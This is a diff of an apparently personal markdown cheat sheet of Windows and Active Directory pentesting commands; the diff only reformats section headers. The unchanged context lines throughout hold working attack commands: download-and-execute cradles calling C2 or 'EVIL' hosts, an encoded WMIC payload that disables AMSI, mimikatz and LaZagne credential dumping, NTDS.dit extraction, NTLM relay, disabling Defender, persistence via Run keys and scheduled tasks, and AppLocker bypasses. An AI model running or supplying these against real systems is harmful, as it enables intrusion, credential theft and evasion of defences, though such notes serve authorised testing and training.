@@ -15,7 +15,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
 
 
 
-Basic's
+## [](#header-4) Basic's
 
 ```powershell
 net users
@@ -45,7 +45,7 @@ $ComputerIPAddress = "10.10.14.14"
 
 https://github.com/tevora-threat/SharpView
 
-Users with SPN
+#### [](#header-4) Users with SPN
 
 ```powershell
 Get-DomainUser -SPN
@@ -56,7 +56,7 @@ PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,Trustedt
 
 
 
-Kerberos Enumeration
+#### [](#header-4) Kerberos Enumeration
 
 ```powershell
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
@@ -64,7 +64,7 @@ nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=
 
 
 
-Active Directory
+#### [](#header-4) Active Directory
 
 ```powershell
 nltest /DCLIST:DomainName
@@ -137,7 +137,7 @@ set u
 
 
 
-SharpView Enumeration
+#### [](#header-4) SharpView Enumeration
 
 ```powershell
 #https://github.com/tevora-threat/SharpView
@@ -175,7 +175,7 @@ Get-NetLoggedon
 
 
 
-SMB Enumeration
+#### [](#header-4) SMB Enumeration
 
 ```powershell
 nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
@@ -196,7 +196,7 @@ nmap --script smb-security-mode.nse -p 445 10.10.14.14
 
 
 
-SNMP Enumeration
+#### [](#header-4) SNMP Enumeration
 
 ```powershell
 snmpwalk -c public -v1 10.10.14.14
@@ -208,7 +208,7 @@ snmpenum -t 10.10.14.14
 
 
 
-MySQL Enumeration
+#### [](#header-4) MySQL Enumeration
 
 ```powershell
 nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
@@ -216,7 +216,7 @@ nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-du
 
 
 
-DNS Zone Transfer
+#### [](#header-4) DNS Zone Transfer
 
 ```powershell
 dig axfr blah.com @ns1.m0chan.com
@@ -226,7 +226,7 @@ dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 
 
 
-LDAP
+#### [](#header-4) LDAP
 
 ```
 ldapsearch -H ldap://<ip>
@@ -235,7 +235,7 @@ ldapwhoami
 
 
 
-RPC Enumeration
+#### [](#header-4) RPC Enumeration
 
 ```powershell
 rpcclient -U "10.10.14.14"
@@ -251,7 +251,7 @@ lookupnames Guest
 lookupnames Administrator
 ```
 
-Remote Desktop
+#### [](#header-4) Remote Desktop
 
 ```powershell
 rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
@@ -266,7 +266,7 @@ ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRES
 
 
 
-TFTP
+#### [](#header-4) TFTP
 
 ```powershell
 m0chan Machine
@@ -279,7 +279,7 @@ tftp -i <[IP]> GET <[FILE]>
 
 
 
-FTP
+#### [](#header-4) FTP
 
 ```powershell
 echo open <[IP]> 21 > ftp.txt
@@ -293,7 +293,7 @@ ftp -v -n -s:ftp.txt
 
 
 
-VBS Script
+#### [](#header-4) VBS Script
 
 ```powershell
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -332,7 +332,7 @@ https://pentest.ws/features
 
 
 
-Powershell
+#### [](#header-4) Powershell
 
 ```powershell
 #https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles
@@ -354,7 +354,7 @@ IEX($browser.DownloadString('https://server/script.ps1'));
 
 
 
-Powershell Base64
+#### [](#header-4) Powershell Base64
 
 ```powershell
 $fileName = "Passwords.kdbx"
@@ -366,7 +366,7 @@ $fileContentEncoded | set-content ($fileName + ".b64")
 
 
 
-Secure Copy / pscp.exe
+#### [](#header-4) Secure Copy / pscp.exe
 
 ```
 pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
@@ -375,7 +375,7 @@ pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
 
 
 
-BitsAdmin.exe
+#### [](#header-4) BitsAdmin.exe
 
 ```
 cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe & start C:\Temp\binary.exe"
@@ -383,7 +383,7 @@ cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c
 
 
 
-Remote Desktop
+#### [](#header-4)Remote Desktop
 
 ```
 rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
@@ -391,7 +391,7 @@ rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
 
 
 
-WinHTTP Com Object
+#### [](#header-4) WinHTTP Com Object
 
 ```
 [System.Net.WebRequest]::DefaultWebProxy
@@ -401,7 +401,7 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps
 
 
 
-CertUtil
+#### [](#header-4) CertUtil
 
 ```powershell
 #File Transfer
@@ -416,7 +416,7 @@ certutil.exe -decode encodedInputFileName decodedOutputFileName
 
 
 
-Curl (Windows 1803+)
+#### [](#header-4)Curl (Windows 1803+)
 
 ```powershell
 curl http://server/file -o file
@@ -427,7 +427,7 @@ IEX(curl http://server/script.ps1);Invoke-Blah
 
 
 
-SMB
+#### [](#header-4) SMB
 
 ```powershell
 python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
@@ -439,7 +439,7 @@ python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 
 
 
-LLMNR / NBT-NS Spoofing
+#### [](#header-4) LLMNR / NBT-NS Spoofing
 
 ```powershell
 #Responder to Steal Creds
@@ -454,7 +454,7 @@ LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallb
 
 
 
-Responder WPAD Attack
+#### [](#header-4) Responder WPAD Attack
 
 ```powershell
 responder -I eth0 wpad
@@ -468,7 +468,7 @@ Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.
 
 
 
-mitm6
+#### [](#header-4) mitm6
 
 ```powershell
 #Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. 
@@ -492,7 +492,7 @@ Shout out to hausec for this super nice tip.
 
 
 
-SCF File Attack
+#### [](#header-4) SCF File Attack
 
 ```powershell
 Create .scf file and drop inside SMB Share and fire up Responder ;) 
@@ -509,7 +509,7 @@ Command=ToggleDesktop
 
 
 
-NTLM-Relay
+#### [](#header-4) NTLM-Relay
 
 ```powershell
 Good article explaining differences between NTLM/Net-NTLMV1&V2
@@ -539,7 +539,7 @@ ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon..
 
 
 
-Priv Exchange
+#### [](#header-4) Priv Exchange
 
 ```powershell
 #https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
@@ -554,7 +554,7 @@ python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -
 
 
 
-CrackMapExec
+#### [](#header-4) CrackMapExec
 
 ```powershell
 CrackMapExec is installed on Kali or get Windows Binary from Github.
@@ -600,7 +600,7 @@ crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M enum_avprod
 
 
 
-Mail Sniper
+#### [](#header-4) Mail Sniper
 
 ```powershell
 Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019
@@ -614,7 +614,7 @@ Lmao, you really think Id use the pass Summer2019?
 
 
 
-Kerberos Stuff
+#### [](#header-4) Kerberos Stuff
 
 ```powershell
 #https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
@@ -623,7 +623,7 @@ Kerberos Stuff
 
 
 
-MSSQL Exploiting (PowerUpSQL)
+#### [](#header-4) MSSQL Exploiting (PowerUpSQL)
 
 ```powershell
 #https://github.com/NetSPI/PowerUpSQL
@@ -676,7 +676,7 @@ Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guid
 
 Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat
 
-Basics
+#### [](#header-4) Basics
 
 ```
 systeminfo
@@ -694,7 +694,7 @@ type C:\Windows\system32\drivers\etc\hosts
 
 
 
-PowerUp.ps1 (Sometimes a Quick Win)
+#### [](#header-4) PowerUp.ps1 (Sometimes a Quick Win)
 
 ```powershell
 powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks
@@ -702,7 +702,7 @@ powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerU
 
 
 
-SharpUp
+#### [](#header-4) SharpUp
 
 ```powershell
 #https://github.com/GhostPack/SharpUp
@@ -712,7 +712,7 @@ C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.
 
 
 
-If It's AD Get Bloodhound Imported...
+#### [](#header-4) If It's AD Get Bloodhound Imported...
 
 ```powershell
 SharpHound.ps1
@@ -729,7 +729,7 @@ If you can't exfil the .zip... Find a way ;) I joke, I joke. Output as plain jso
 
 
 
-Bloodhound-Python
+#### [](#header-4) Bloodhound-Python
 
 ```python
 git clone https://github.com/fox-it/BloodHound.py.git
@@ -740,7 +740,7 @@ bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER
 
 
 
-Cleartext Passwords
+#### [](#header-4) Cleartext Passwords
 
 ```powershell
 # Windows autologin
@@ -762,7 +762,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 
 
-View Installed Software
+#### [](#header-4) View Installed Software
 
 ```powershell
 tasklist /SVC
@@ -781,7 +781,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 
 
-Weak Folder Permissions
+#### [](#header-4) Weak Folder Permissions
 
 ```powershell
 Full Permissions for 'Everyone' on Program Folders
@@ -803,7 +803,7 @@ icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users
 
 
 
-Scheduled Tasks
+#### [](#header-4) Scheduled Tasks
 
 ```powershell
 schtasks /query /fo LIST /v
@@ -811,7 +811,7 @@ schtasks /query /fo LIST /v
 
 
 
-Powershell History
+#### [](#header-4) Powershell History
 
 ```powershell
 type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -821,7 +821,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 
 
-View Connected Drives
+#### [](#header-4) View Connected Drives
 
 ```powershell
 net use
@@ -832,7 +832,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 
 
-View Privs
+#### [](#header-4) View Privs
 
 ```powershell
 whoami /priv
@@ -842,7 +842,7 @@ Look for SeImpersonate, SeDebugPrivilege etc
 
 
 
-Is Anyone Else Logged In?
+#### [](#header-4) Is Anyone Else Logged In?
 
 ```
 qwinsta
@@ -850,7 +850,7 @@ qwinsta
 
 
 
-View Registry Auto-Login
+#### [](#header-4) View Registry Auto-Login
 
 ```powershell
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
@@ -860,7 +860,7 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
 
 
 
-View Stored Creds in Credential Manager
+#### [](#header-4) View Stored Creds in Credential Manager
 
 ```powershell
 cmdkey /list
@@ -873,7 +873,7 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 
 
 
-View Unquoted Service Paths
+#### [](#header-4) View Unquoted Service Paths
 
 ```powershell
 wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
@@ -883,7 +883,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 
 
-View Startup Items
+#### [](#header-4) View Startup Items
 
 ```powershell
 wmic startup get caption,command
@@ -897,7 +897,7 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 
 
 
-Check for AlwaysInstalledElevated Reg Key
+#### [](#header-4) Check for AlwaysInstalledElevated Reg Key
 
 ```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -909,7 +909,7 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 
 
 
-Any Passwords in Registry?
+#### [](#header-4) Any Passwords in Registry?
 
 ```powershell
 reg query HKCU /f password /t REG_SZ /s
@@ -918,7 +918,7 @@ reg query HKLM /f password /t REG_SZ /s
 
 
 
-Any Sysrep or Unattend Files Left Over
+#### [](#header-4) Any Sysrep or Unattend Files Left Over
 
 ```powershell
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
@@ -928,7 +928,7 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 
 
 
-GPP (Group Policy Preferences) Passwords
+#### [](#header-4) GPP (Group Policy Preferences) Passwords
 
 ```
 smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan
@@ -942,7 +942,7 @@ Can also use PowerUP.ps1
 
 
 
-Dump Chrome Passwords (Also Post Exploit)
+#### [](#header-4) Dump Chrome Passwords (Also Post Exploit)
 
 ```powershell
 #git clone https://github.com/rasta-mouse/CookieMonster
@@ -964,7 +964,7 @@ mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData
 
 
 
-Dump KeePass
+#### [](#header-4) Dump KeePass
 
 ```powershell
 #https://github.com/HarmJ0y/KeeThief
@@ -986,7 +986,7 @@ KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be use
 
 
 
-Token Impersonation
+#### [](#header-4)Token Impersonation
 
 ```powershell
 https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1
@@ -1015,7 +1015,7 @@ Reflectively Load .NET Assembly within Powershell if you cant do it through your
 
 
 
-Juicy Potato
+#### [](#header-4) Juicy Potato
 
 ```powershell
 #Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)
@@ -1041,7 +1041,7 @@ JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL
 
 
 
-Kerberoasting
+#### [](#header-4) Kerberoasting
 
 ```powershell
 #Check my Blog Post Kerberos Attacks in Depth for Further Information
@@ -1062,7 +1062,7 @@ https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into
 
 
 
-Kerberoast with Python
+#### [](#header-4) Kerberoast with Python
 
 ```powershell
 #https://github.com/skelsec/kerberoast
@@ -1086,7 +1086,7 @@ kerberoast spnroast <kerberos_connection_string> -t ldapenum_spn_users.txt
 
 
 
-AS Rep Roasting
+#### [](#header-4) AS Rep Roasting
 
 ```powershell
 #Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable
@@ -1100,7 +1100,7 @@ Can also use Rebeus (Reflectively Load .NET Assembly.)
 
 
 
-DCSync (Also Post Exploit)
+#### [](#header-4) DCSync (Also Post Exploit)
 
 ```powershell
 #Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. 
@@ -1121,7 +1121,7 @@ Empire Module: powershell/credentials/mimikatz/dcsync_hashdump
 
 
 
-Useful Commands
+#### [](#header-4) Useful Commands
 
 ```powershell
 net user m0chan /add /domain
@@ -1151,7 +1151,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 
 
-Check if Powershell Logging is Enabled
+#### [](#header-4) Check if Powershell Logging is Enabled
 
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
@@ -1160,7 +1160,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 
 
 
-Run Seatbelt (ABSOLUTELY MUST)
+#### [](#header-4) Run Seatbelt (ABSOLUTELY MUST)
 
 ```powershell
 #https://github.com/GhostPack/Seatbelt
@@ -1204,7 +1204,7 @@ And more!!
 
 
 
-Dump Creds
+#### [](#header-4) Dump Creds
 
 ```powershell
 (new-object System.Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz 
@@ -1243,7 +1243,7 @@ lsadump::sam
 
 
 
-Dump Creds #2
+#### [](#header-4) Dump Creds #2
 
 ```powershell
 #https://github.com/AlessandroZ/LaZagne
@@ -1256,7 +1256,7 @@ laZagne.exe browsers -firefox
 
 
 
-Dump Chrome Passwords (Also Post Exploit)
+#### [](#header-4) Dump Chrome Passwords (Also Post Exploit)
 
 ```powershell
 #git clone https://github.com/rasta-mouse/CookieMonster
@@ -1278,7 +1278,7 @@ mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData
 
 
 
-Dump KeePass
+#### [](#header-4) Dump KeePass
 
 ```powershell
 #https://github.com/HarmJ0y/KeeThief
@@ -1298,7 +1298,7 @@ KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be use
 
 
 
-pypykatz
+#### [](#header-4) pypykatz
 
 ```
 #https://github.com/skelsec/pypykatz
@@ -1310,7 +1310,7 @@ pip3 install pypykatz
 
 
 
-SafetyKatz
+#### [](#header-4) SafetyKatz
 
 ```powershell
 #https://github.com/GhostPack/SafetyKatz
@@ -1324,7 +1324,7 @@ First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSAS
 
 
 
-SharpDPAPI
+#### [](#header-4) SharpDPAPI
 
 ```powershell
 #https://github.com/GhostPack/SharpDPAPI
@@ -1334,7 +1334,7 @@ Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to D
 
 
 
-Check for Missing KB's
+#### [](#header-4) Check for Missing KB's
 
 ```powershell
 watson.exe
@@ -1349,7 +1349,7 @@ https://github.com/rasta-mouse/Watson
 
 
 
-Decrypt EFS Files with Mimikatz if Admin/System
+#### [](#header-4) Decrypt EFS Files with Mimikatz if Admin/System
 
 ```powershell
 #https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
@@ -1377,7 +1377,7 @@ certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
 
 
 
-UAC Bypass
+#### [](#header-4) UAC Bypass
 
 ```
 https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info 
@@ -1393,7 +1393,7 @@ C:\Windows\SysWOW64\SystemPropertiesRemote.exe
 
 
 
-Golden Ticket Attack
+#### [](#header-4) Golden Ticket Attack
 
 ```powershell
 #Check my Blog Post Kerberos Attacks in Depth for Further Information
@@ -1420,7 +1420,7 @@ mimikatz # kerberos::ptt <ticket_kirbi_file>
 
 
 
-Child Domain to Forest Compromise
+#### [](#header-4) Child Domain to Forest Compromise
 
 ```powershell
 Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC
@@ -1454,7 +1454,7 @@ harmj0ys article explains it best.
 
 
 
-Dump NTDS.dit
+#### [](#header-4) Dump NTDS.dit
 
 ```powershell
 C:\vssadmin create shadow /for=C:
@@ -1476,7 +1476,7 @@ If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTD
 
 
 
-SeBackupPrivlege - Dump NTDS.dit
+#### [](#header-4) SeBackupPrivlege - Dump NTDS.dit
 
 ```powershell
 Import-Module .\SeBackupPrivilegeCmdLets.dll
@@ -1506,7 +1506,7 @@ reg.exe save hklm\system c:\m0chan\SYSTEM.bak
 
 
 
-SSH Shuttle
+#### [](#header-4) SSH Shuttle
 
 ```
 ./run -r root@10.10.110.123 172.16.1.0/24 -e "ssh -i Root.key"
@@ -1514,7 +1514,7 @@ SSH Shuttle
 
 
 
-AutoRun Registry
+#### [](#header-4) AutoRun Registry
 
 ```
 [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
@@ -1532,7 +1532,7 @@ AutoRun Registry
 
 
 
-Run & Run Once
+#### [](#header-4) Run & Run Once
 
 ```
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
@@ -1541,7 +1541,7 @@ reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Wi
 
 
 
-Scheduled Tasks
+#### [](#header-4) Scheduled Tasks
 
 ```
 #Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.
@@ -1562,7 +1562,7 @@ schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "SoftwareUpdate" /tr C:\Te
 
 
 
-Windows Startup Folder 
+#### [](#header-4) Windows Startup Folder 
 
 ```
 This has been around for years as basically every version of Windows contains a startup folder. 
@@ -1574,7 +1574,7 @@ Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start
 
 
 
-EXE/DLL Hijacking
+#### [](#header-4) EXE/DLL Hijacking
 
 ```
 Look for any missing DLL's or EXE's that common programs are calling on startup and over write them with your payload/malware.
@@ -1584,7 +1584,7 @@ Also if you are localadmin/system you could provide over write a normal service 
 
 
 
-Add User Account
+#### [](#header-4) Add User Account
 
 ```
 net user m0chan /add /domain
@@ -1595,7 +1595,7 @@ net user m0chan /domain /comment:"Your Blueteam Fucking Sucks"
 
 
 
-Persistence with Kerberos
+#### [](#header-4) Persistence with Kerberos
 
 ```
 We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. 
@@ -1621,7 +1621,7 @@ Can also inject kirbi with Rebeus
 
 
 
-Plink
+#### [](#header-4) Plink
 
 ```
 plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
@@ -1633,7 +1633,7 @@ ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 
 
 
-Powershell Port Forward
+#### [](#header-4) Powershell Port Forward
 
 ```powershell
 netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip
@@ -1648,7 +1648,7 @@ toip: the ip address to forward to
 
 
 
-Socat for Windows
+#### [](#header-4) Socat for Windows
 
 ```powershell
 #https://github.com/StudioEtrange/socat-windows
@@ -1671,7 +1671,7 @@ socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
 
 
 
-Secure Sockets Funneling
+#### [](#header-4) Secure Sockets Funneling
 
 ```powershell
 #https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf
@@ -1682,7 +1682,7 @@ Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt 
 
 
 
-Chisel (Fast TCP Tunnel over HTTP secured by SSH)
+#### [](#header-4) Chisel (Fast TCP Tunnel over HTTP secured by SSH)
 
 ```powershell
 #https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html
@@ -1690,7 +1690,7 @@ Chisel (Fast TCP Tunnel over HTTP secured by SSH)
 
 
 
-CrackMapExec
+#### [](#header-4) CrackMapExec
 
 ```powershell
 #https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/
@@ -1698,7 +1698,7 @@ CrackMapExec
 
 
 
-WMIC Spawn Process
+#### [](#header-4) WMIC Spawn Process
 
 ```powershell
 wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="
@@ -1706,7 +1706,7 @@ wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powers
 
 
 
-Invoke-WMIExec.ps1
+#### [](#header-4) Invoke-WMIExec.ps1
 
 ```powershell
 Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d
@@ -1718,7 +1718,7 @@ PS C:\users\user\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0chan 
 
 
 
-Powershell Invoke-Command (Requires Port 5985)
+#### [](#header-4) Powershell Invoke-Command (Requires Port 5985)
 
 ```powershell
 $secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
@@ -1729,7 +1729,7 @@ Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock {whoami}
 
 
 
-PSExec
+#### [](#header-4) PSExec
 
 ```
 psexec.exe \\dc01.m0chanAD.local cmd.exe
@@ -1737,7 +1737,7 @@ psexec.exe \\dc01.m0chanAD.local cmd.exe
 
 
 
-Powershell Remoting
+#### [](#header-4) Powershell Remoting
 
 ```powershell
 $secpasswd = ConvertTo-SecureString 'password' -AsPlainText -Force
@@ -1749,7 +1749,7 @@ Enter-PSSession $Session
 
 
 
-Configure Remote Service over SMB (Requires Local Admin on Target Machine)
+#### [](#header-4) Configure Remote Service over SMB (Requires Local Admin on Target Machine)
 
 ```powershell
 net use \\192.168.0.15 [password] /u:DOMAIN\m0chan
@@ -1763,7 +1763,7 @@ sc \\192.168.0.15 start <service_name>
 
 
 
-Pass-The-Hash
+#### [](#header-4) Pass-The-Hash
 
 ```powershell
 crackmapexec <ip> -u <user> -H "<lm>" -x "<msfvenom psh-cmd>"
@@ -1781,11 +1781,10 @@ sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893
 
 
 
-Pass-The-Ticket
+#### [](#header-4) Pass-The-Ticket
 
 ```powershell
 #Check my Blog Post Kerberos Attacks in Depth for Further Information
-#https://m0chan.github.io/Kerberos-Attacks-In-Depth
 
 Rebeus monitor /interval:30 
 
@@ -1804,7 +1803,7 @@ We can now request TGS service tickets to access network resources as this user
 
 
 
-Invoke-Obfusaction
+#### [](#header-4) Invoke-Obfusaction
 
 ```powershell.exe
 #https://github.com/danielbohannon/Invoke-Obfuscation
@@ -1822,7 +1821,7 @@ SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEA
 
 
 
-Invoke-CradleCraft
+#### [](#header-4) Invoke-CradleCraft
 
 ```
 #https://github.com/danielbohannon/Invoke-CradleCrafter
@@ -1836,7 +1835,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://c2server.com/Invoke-Mimika
 
 
 
-Invoke-DOSfuscation
+#### [](#header-4) Invoke-DOSfuscation
 
 ```
 #https://github.com/danielbohannon/Invoke-DOSfuscation
@@ -1848,7 +1847,7 @@ Invoke-DOSfuscation
 
 
 
-Verify is you are in constrained mode
+#### [](#header-4) Verify is you are in constrained mode
 
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -1856,7 +1855,7 @@ $ExecutionContext.SessionState.LanguageMode
 
 
 
-PowershellVeryLess Bypass
+#### [](#header-4) PowershellVeryLess Bypass
 
 ```powershell
 git clone https://github.com/decoder-it/powershellveryless.git
@@ -1877,7 +1876,7 @@ script.ps1 = Script of your Choice
 
 
 
-World Writable Folders (By Default on Windows 10 1803) - Shoutout to api0cradle.
+#### [](#header-4) World Writable Folders (By Default on Windows 10 1803) 
 
 ```powershell
 #https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
@@ -1901,7 +1900,7 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 
 
 
-Downgrade Attack
+#### [](#header-4) Downgrade Attack
 
 ```powershell
 Downgrading to PS Version 2 circumvates AppLocker
@@ -1914,7 +1913,7 @@ Get-Host
 
 
 
-AppLocker COR Profile Bypass
+#### [](#header-4) AppLocker COR Profile Bypass
 
 ```
 set COR_ENABLE_PROFILING=1
@@ -1928,7 +1927,7 @@ Where .DLL is your payload i/e reverse shell, beacon etc.
 
 
 
-MSBuild Powershell/CMD Bypass
+#### [](#header-4)MSBuild Powershell/CMD Bypass
 
 ```powershell
 You can use this if cmd is not disabled but powershell is
@@ -1944,7 +1943,7 @@ MSBuild PSAttack :D :D
 
 
 
-PSAttack
+#### [](#header-4) PSAttack
 
 ```powershell
 #https://github.com/jaredhaight/PSAttack
@@ -1956,7 +1955,7 @@ Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflec
 
 
 
-NoPowerShell
+#### [](#header-4) NoPowerShell
 
 ```powershell
 #https://github.com/bitsadmin/nopowershell
